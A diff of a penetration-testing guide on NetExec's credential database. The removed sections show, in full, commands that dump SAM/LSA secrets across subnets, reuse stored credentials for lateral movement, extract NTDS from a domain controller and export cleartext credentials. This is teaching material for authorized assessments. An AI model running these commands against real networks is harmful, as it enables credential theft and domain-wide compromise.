@@ -347,65 +347,6 @@ nxcdb export creds-by-host mapping.csv
 
 This reveals credential reuse patterns. If `administrator`'s hash works on 50 systems, you've identified a privileged account with extensive lateral movement potential.
 
-### Practical Workflow Integration
-
-During a multi-day engagement, the workflow becomes:
-
-**Day 1:**
-```bash
-# Initial credential extraction
-netexec smb 192.168.1.0/24 -u admin -p password --sam --lsa
-
-# Database automatically populated with extracted creds
-nxcdb creds
-# Shows: 45 new credentials stored
-```
-
-**Day 2:**
-```bash
-# Discover new subnet
-# Instead of re-extracting, use stored credentials
-netexec smb 192.168.2.0/24 -id ALL --shares
-
-# Find that credential ID 12 (svc-backup) works everywhere
-nxcdb creds -id 12
-# DOMAIN\\svc-backup with domain admin privileges
-
-# Leverage it for domain-wide access
-netexec smb dc.corp.local -id 12 --ntds
-```
-
-**Day 3:**
-```bash
-# New operator joins the assessment
-# They query the database for context
-nxcdb creds --cleartext
-# Sees service account passwords
-
-nxcdb hosts
-# Sees 200+ compromised systems
-
-# Continues work without redundant extraction
-netexec smb new-targets.txt -id ALL
-```
-
-### Export Capabilities
-
-For reporting or external tool integration, the database supports exports:
-
-```bash
-# Export all credentials to text file
-nxcdb export creds credentials.txt
-
-# Export in CSV format for spreadsheet analysis
-nxcdb export creds credentials.csv
-
-# Export hosts with their vulnerabilities
-nxcdb export hosts compromised_systems.csv
-```
-
-These exports integrate with vulnerability management platforms or become appendices in penetration test reports.
-
 ### Why This Matters
 
 In real-world assessments, credential extraction isn't a one-time event. It's iterative. You extract credentials from Host A, use them to access Host B, extract more credentials, and continue. Without persistent storage, operators waste time re-extracting credentials they've already obtained or, worse, lose track of what they've discovered.
